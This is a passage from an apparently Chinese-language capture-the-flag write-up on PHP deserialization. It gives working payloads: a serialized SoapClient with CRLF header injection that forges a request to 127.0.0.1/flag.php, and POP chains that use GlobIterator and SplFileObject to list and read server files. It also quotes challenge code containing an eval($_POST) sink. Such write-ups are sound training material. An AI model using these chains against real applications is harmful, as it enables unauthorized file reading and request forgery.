punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&amp;'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&amp;'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>\n<span class=\"token comment\">#O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A203%3A%22qwq%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>接下来赋值给<code>vip</code>参数</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080126969.png\" alt=\"image-20230408012637885\"></p>\n<p>接下来访问<code>flag.txt</code></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080127756.png\" alt=\"image-20230408012701715\"></p>\n<h2 id=\"遍历目录-文件读取\"><a href=\"#遍历目录-文件读取\" class=\"headerlink\" title=\"遍历目录+文件读取\"></a>遍历目录+文件读取</h2><h3 id=\"CTFSHOW-愚人杯-被遗忘的反序列化\"><a href=\"#CTFSHOW-愚人杯-被遗忘的反序列化\" class=\"headerlink\" title=\"CTFSHOW 愚人杯[被遗忘的反序列化]\"></a>CTFSHOW 愚人杯[被遗忘的反序列化]</h3><p>环境如下<a href=\"https://ctf.show/challenges#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3968\">https://ctf.show/challenges#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3968</a></p>\n<p>代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\"># 当前目录中有一个txt文件哦</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"check.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">EeE</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$text</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$eeee</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">text</span> <span class=\"token operator\">==</span> <span class=\"token string double-quoted-string\">\"aaaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token function\">lcfirst</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">text</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$kk</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"<span class=\"token interpolation\"><span class=\"token variable\">$kk</span></span>,eeeeeeeeeeeee\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__clone</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">cycycycy</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$a</span> <span class=\"token operator\">-></span> <span class=\"token function\">aaa</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cycycycy</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">aaa</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token function\">cipher</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"p8vfuv8g8v8py\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"eval\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$a_a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"\\$a_a\\$\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">gBoBg</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$coos</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$eeee</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"-_-\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">coos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">coos</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$aa</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">coos</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$bb</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$aa</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>   \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w_wuw_w</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|63|\\*|\\?/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"不行哦\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">aaa</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">clone</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">EeE</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$_ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"HTTP_AAAAAA\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_ip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>寻找出口，发现这个<code>eval</code>函数，具体代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">cycycycy</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">aaa</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'get'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token function\">cipher</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$get</span> <span class=\"token operator\">===</span> <span class=\"token string double-quoted-string\">\"p8vfuv8g8v8py\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"eval\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当满足<code>$get === &quot;p8vfuv8g8v8py&quot;</code>才可实现命令执行，但这里<code>get</code>参数被加密了，所以可以尝试下PHP原生类，此时的思路如下，它提示了当前目录存在txt文件，我们知道<code>Globlterator</code>类只需要知道文件名的一部分，就可以获取整个文件名，因此我们可以通过它来寻找<code>txt</code>文件。如何触发<code>Globlterator</code>类呢，当然是找有<code>a(b)</code>此类的，且<code>a,b</code>均可控，同时对函数进行输出，此时看到<code>gBoBg</code>类中的<code>__tostring</code>方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">coos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>这个完全符合条件，我们给<code>coos</code>赋值为<code>Globlterator</code>，给<code>file</code>赋值为<code>*txt</code>即可输出含有<code>txt</code>的文件名。但如何触发<code>__tostring</code>魔术方法呢，<code>__tostring</code>魔术方法是当函数被当做字符串时触发的，因此我们随便找一个即可，这里看到<code>w_wuw_w</code>类中的<code>key</code>参数，<code>$this-&gt;key</code>这个就可以作为<code>__tostring</code>的函数触发点。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w_wuw_w</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php|63|\\*|\\?/i\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"不行哦\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>因此接下来构造一下代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">gBoBg</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'*txt'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$coos</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'GlobIterator'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>   \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w_wuw_w</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$pop</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w_wuw_w</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">gBoBg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'123'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O:7:\"w_wuw_w\":3:&#123;s:3:\"aaa\";N;s:3:\"key\";O:5:\"gBoBg\":3:&#123;s:4:\"name\";s:1:\"1\";s:4:\"file\";s:4:\"*txt\";s:4:\"coos\";s:12:\"GlobIterator\";&#125;s:4:\"file\";s:3:\"123\";&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>赋值给<code>$_SERVER[&quot;HTTP_AAAAAA&quot;];</code>这个其实在请求头字段进行赋值，我们这里的话，<code>AAAAAA= &#39;xxx&#39;</code>即可实现赋值</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080211689.png\" alt=\"image-20230408021139612\"></p>\n<p>发现<code>h1nt.txt</code>，接下来用<code>SplFileObject </code>类进行读取即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">gBoBg</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'h1nt.txt'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$coos</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'SplFileObject'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>   \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w_wuw_w</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$pop</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w_wuw_w</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">gBoBg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'123'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pop</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#O:7:\"w_wuw_w\":3:&#123;s:3:\"aaa\";N;s:3:\"key\";O:5:\"gBoBg\":3:&#123;s:4:\"name\";s:1:\"1\";s:4:\"file\";s:8:\"h1nt.txt\";s:4:\"coos\";s:13:\"SplFileObject\";&#125;s:4:\"file\";s:3:\"123\";&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080214099.png\" alt=\"image-20230408021451045\"></p>\n<p>emmm，只给出了这样一句话，应该是没回显完整，但此时转念一想，这个只是<code>hint</code>，里面应该也不会有<code>flag</code>，我们为什么不直接去根目录找flag文件然后读呢，因此接下来尝试去根目录下寻找flag文件。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">gBoBg</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/f*'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$coos</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'GlobIterator'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>   \n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">w_wuw_w</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$aaa</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$key</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$file</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$pop</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">w_wuw_w</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">key</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">gBoBg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$pop</span><span class=\"token operator\">-></span><span class=\"token property\">file</span> <span class=\"token operator\">=</span> <span class=\"token string 